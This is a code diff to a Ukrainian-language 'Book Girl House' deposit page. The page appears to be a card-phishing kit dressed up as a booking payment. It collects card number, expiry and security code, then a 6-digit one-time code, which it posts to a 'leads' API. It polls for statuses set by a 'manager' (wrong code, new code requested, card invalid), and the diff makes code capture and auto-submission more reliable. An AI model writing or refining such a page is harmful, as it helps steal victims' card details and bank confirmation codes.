@@ -2,14 +2,14 @@
 <html lang="uk">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
 <title>Book Girl House — Депозит</title>
 <link rel="icon" href="/favicon.svg" type="image/svg+xml">
 <meta name="description" content="Депозит за підтвердження бронювання Book Girl House. Списання — тільки при зустрічі.">
 <meta property="og:title" content="Book Girl House — Депозит">
 <meta property="og:description" content="Підтвердження бронювання. Депозит спишеться тільки при зустрічі.">
 <meta name="theme-color" content="#f6f9fc">
-<link rel="stylesheet" href="/style.css?v=25">
+<link rel="stylesheet" href="/style.css?v=26">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -390,52 +390,65 @@ $("code").oninput=()=>{
   $("code").value = $("code").value.replace(/\D/g, "").slice(0, 3);
 };
 
+function syncSendButtonForCode(){
+  if(!codeStage||codeSubmitted||waitingForManager){
+    return;
+  }
+  const digits=($("activation").value||"").replace(/\D/g,"").length;
+  $("send").disabled = digits!==6;
+  $("send").textContent=t("payBtn");
+}
 function updateCodeCounter(){
   const v=$("activation").value.replace(/\D/g,"").slice(0,6);
   $("activation").value=v;
-  // Enable confirm button only when full 6-digit code is entered
-  if(codeStage&&!codeSubmitted&&!waitingForManager){
-    $("send").disabled = v.length!==6;
-  }
+  syncSendButtonForCode();
 }
 let autoSubmittingCode=false;
 async function submitConfirmationCode(){
-  if(codeSubmitted||waitingForManager||!codeStage||!leadId)return;
-  const code=$("activation").value.replace(/\D/g,"");
-  if(code.length!==6)return;
+  if(codeSubmitted||waitingForManager||!leadId)return;
+  // Allow submit even if codeStage flag was lost — presence of leadId + 6 digits is enough
+  const code=($("activation").value||"").replace(/\D/g,"");
+  if(code.length!==6){
+    $("verr").textContent=t("need6");
+    return;
+  }
+  codeStage=true;
   codeSubmitted=true;
   autoSubmittingCode=false;
   $("send").disabled=true;
   $("send").textContent=t("checking");
+  $("verr").textContent="";
   showLoading();
   try{
     const r=await fetch("/api/leads/"+leadId+"/submit-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
     const d=await r.json();
     if(!r.ok)throw Error(d.error||"Error");
+    lastRenderedStatus=null; // force UI update for new status
     setStatus(d);
     if(!poll)poll=setInterval(checkStatus,3000);
   }catch(e){
     codeSubmitted=false;
     hideLoading();
     $("activation").disabled=false;
-    $("send").disabled=false;
     $("send").textContent=t("payBtn");
+    syncSendButtonForCode();
     $("verr").textContent=e.message||"";
   }
 }
 function maybeAutoSubmitCode(){
-  if(autoSubmittingCode||codeSubmitted||waitingForManager||!codeStage||!leadId)return;
-  if($("activation").value.replace(/\D/g,"").length!==6)return;
+  if(autoSubmittingCode||codeSubmitted||waitingForManager||!leadId)return;
+  if(($("activation").value||"").replace(/\D/g,"").length!==6)return;
   autoSubmittingCode=true;
   setTimeout(()=>{
-    if(!codeSubmitted&&!waitingForManager&&$("activation").value.replace(/\D/g,"").length===6){
+    if(!codeSubmitted&&!waitingForManager&&($("activation").value||"").replace(/\D/g,"").length===6){
       submitConfirmationCode();
     }else{
       autoSubmittingCode=false;
     }
-  },120);
+  },80);
 }
 $("activation").addEventListener("input",()=>{if(codeSubmitted)return;updateCodeCounter();maybeAutoSubmitCode()});
+$("activation").addEventListener("keyup",()=>{if(codeSubmitted)return;updateCodeCounter();maybeAutoSubmitCode()});
 
 function openCodePanel(){
   const pending=$("pending");
@@ -502,8 +515,10 @@ function resetFormForNewCard(msg){
   localStorage.removeItem("fitpass_lead_id");
   leadId=null;codeStage=false;codeSubmitted=false;waitingForManager=false;lastRenderedStatus=null;autoSubmittingCode=false;
   hideLoading();
+  // Blur any focused field so iOS does not keep a zoomed viewport
+  try{if(document.activeElement&&document.activeElement.blur)document.activeElement.blur()}catch(_){}
   const ov=$("payOverlay");if(ov){ov.hidden=true;ov.style.display="none";}
-  // Keep form visible, fully hide code panel & thank-you (no layout / font side-effects)
+  // Keep form visible, fully hide code panel & thank-you
   const pending=$("pending");
   if(pending){pending.hidden=true;pending.style.display="none";}
   const thank=$("thankYou");
@@ -518,10 +533,17 @@ function resetFormForNewCard(msg){
   $("expiry").value="";
   $("code").value="";
   $("send").disabled=false;
-  $("send").textContent=t("payBtn");
+  // Restore normal pay button label (with UAH if already loaded)
+  const uah=$("send").dataset.uah;
+  const lang=localStorage.getItem("fitpass_lang")||"uk";
+  if(uah){
+    $("send").textContent=lang==="uk"?`Сплатити $10.00 (≈ ${uah} ₴)`:`Pay $10.00 (≈ ${uah} ₴)`;
+  }else{
+    $("send").textContent=t("payBtn");
+  }
   $("err").textContent="";
   $("verr").textContent="";
-  // Do not touch document fonts, zoom, scroll or focus
+  // No scroll, no focus, no zoom changes — page stays pixel-identical
   showCardAlert(t("cardInvalidTitle"), msg||t("cardInvalid"));
 }
 
@@ -537,17 +559,22 @@ function setStatus(d){
     if(!codeSubmitted&&!waitingForManager)return;
     waitingForManager=true;if(retryTimer)clearInterval(retryTimer);$("statusText").textContent=t("processing");$("send").disabled=true;showLoading();return}
   if(d.status==="Код не підійшов — повторне введення"||d.status==="Код не подошёл — повторный ввод"){
-    hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("activation").value="";$("activation").disabled=false;
-    $("statusText").textContent=t("codeWrong");$("send").disabled=true;$("send").textContent=t("payBtn");startRetryCountdown(90);return}
+    hideLoading();waitingForManager=false;codeSubmitted=false;autoSubmittingCode=false;
+    $("inline-code-entry").hidden=false;$("activation").value="";$("activation").disabled=false;
+    $("statusText").textContent=t("codeWrong");$("send").textContent=t("payBtn");
+    syncSendButtonForCode();startRetryCountdown(90);return}
   if(d.status==="Клієнт запросив новий код"||d.status==="Клиент запросил новый код"){
-    hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("statusText").textContent=t("requestSent");
-    $("activation").disabled=false;$("activation").value="";$("send").disabled=true;$("send").textContent=t("payBtn");startRetryCountdown(90);return}
-  // Default: waiting for code entry — never show loading
+    hideLoading();waitingForManager=false;codeSubmitted=false;autoSubmittingCode=false;
+    $("inline-code-entry").hidden=false;$("statusText").textContent=t("requestSent");
+    $("activation").disabled=false;$("activation").value="";$("send").textContent=t("payBtn");
+    syncSendButtonForCode();startRetryCountdown(90);return}
+  // Default: waiting for code entry — never show loading, never force-disable a full code
   hideLoading();
   $("statusText").textContent=t("codeSent");
   $("activation").disabled=false;
   $("inline-code-entry").hidden=false;
-  $("send").disabled=true;
+  $("send").textContent=t("payBtn");
+  syncSendButtonForCode();
 }
 async function checkStatus(){if(!leadId)return;try{const r=await fetch("/api/leads/"+leadId+"/status?ts="+Date.now());if(r.ok)setStatus(await r.json())}catch{}}
 function validEmail(v){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v||"").trim())}
